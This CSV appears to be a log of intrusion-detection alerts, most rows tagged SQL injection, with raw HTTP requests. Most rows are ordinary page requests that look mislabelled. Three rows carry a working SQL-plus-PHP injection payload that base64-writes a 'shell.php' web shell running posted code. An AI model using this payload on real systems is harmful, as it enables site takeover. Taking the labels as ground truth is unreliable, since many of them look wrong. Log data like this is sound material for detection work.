장비발생시간,출발지IP,목적지IP,목적지포트,공격명,raw_data
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_22050.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Fri, 18 Dec 2015 09:14:24 GMT If-None-Match: ""220-5272890cb3d82"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_300250.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Wed, 19 Aug 2015 01:25:24 GMT If-None-Match: ""1d3-51d9fe8b524d0"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache1 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_300250.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Wed, 19 Aug 2015 01:25:24 GMT If-None-Match: ""1d3-51d9fe8b524d0"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_690100.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Fri, 05 Feb 2016 00:23:39 GMT If-None-Match: ""1d7-52afadce82146"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache1 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_690100.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Fri, 05 Feb 2016 00:23:39 GMT If-None-Match: ""1d7-52afadce82146"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_690100.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Fri, 05 Feb 2016 00:23:39 GMT If-None-Match: ""1d7-52afadce82146"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/po_ad_page_120160.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: www.hankooki.com If-Modified-Since: Wed, 16 Aug 2017 01:22:29 GMT If-None-Match: ""1f2-556d4babaad19"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache1 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/po_ad_page_120160.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: www.hankooki.com If-Modified-Since: Wed, 16 Aug 2017 01:22:29 GMT If-None-Match: ""1f2-556d4babaad19"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection, GET /ad/worldcuptalk_ad_790480.php HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: hankooki.com X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /js/v02/bottom_spon_v05.htm?wmcode=daily HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Tue, 31 Jul 2018 05:14:40 GMT If-None-Match: ""32b3-57244a7b435dc"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /js/v02/bottom_spon_v05.htm?wmcode=daily HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Tue, 31 Jul 2018 05:14:40 GMT If-None-Match: ""32b3-57244a7b435dc"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /js/v02/more.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Thu, 23 Aug 2018 04:34:58 GMT If-None-Match: ""2194-57412c81aeaa3"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /js/v02/more.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Thu, 23 Aug 2018 04:34:58 GMT If-None-Match: ""2194-57412c81aeaa3"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection, GET /lpage/society/201901/dh20190116235016137840.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache1 (Jaguar/3.0-11) Connection: Keep-Alive
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection, GET /lpage/society/201901/dh20190116235016137840.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection, GET /lpage/society/201901/dh20190116235016137840.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /service/v01/multimedia_300.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: eyenews.hankooki.com If-Modified-Since: Wed, 25 Jul 2018 02:20:03 GMT If-None-Match: ""12c2-571c9842edb9e"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache1 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-02-01 10:23,118.24.16.231,10.10.42.111,443,SqlInjection," GET /dsc HTTP/1.1 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Accept: */* Accept-Language: zh-cn Referer: http://www.dosimsenior.or.kr/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))} User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) X-Forwarded-For: 239.35.7.219 Client-IP: 239.35.7.219 Host: 50plus.or.kr "
2019-02-01 10:23,118.24.16.231,10.10.42.111,443,SqlInjection," GET /dsc/index.do HTTP/1.1 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Accept: */* Accept-Language: zh-cn Referer: http://www.dosimsenior.or.kr/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))} User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) X-Forwarded-For: 239.35.7.219 Client-IP: 239.35.7.219 Host: 50plus.or.kr "
2019-02-01 10:23,118.24.16.231,10.10.42.111,443,SqlInjection," GET /dsc?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))} HTTP/1.1 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Accept: */* Accept-Language: zh-cn Referer: http://www.dosimsenior.or.kr/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))} User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) X-Forwarded-For: 239.35.7.219 Client-IP: 239.35.7.219 Host: 50plus.or.kr "
2019-02-17 21:31,125.56.218.42,172.19.3.203,80,PL_C_01_SQL Injection,"GET /index.php HTTP/1.1 index\=0000, lang\=Cn"
2019-02-09 8:32,23.210.215.132,172.19.3.212,80,PL_C_01_SQL Injection,"GET /index.php HTTP/1.1 lang\=Cn, index\=0000"
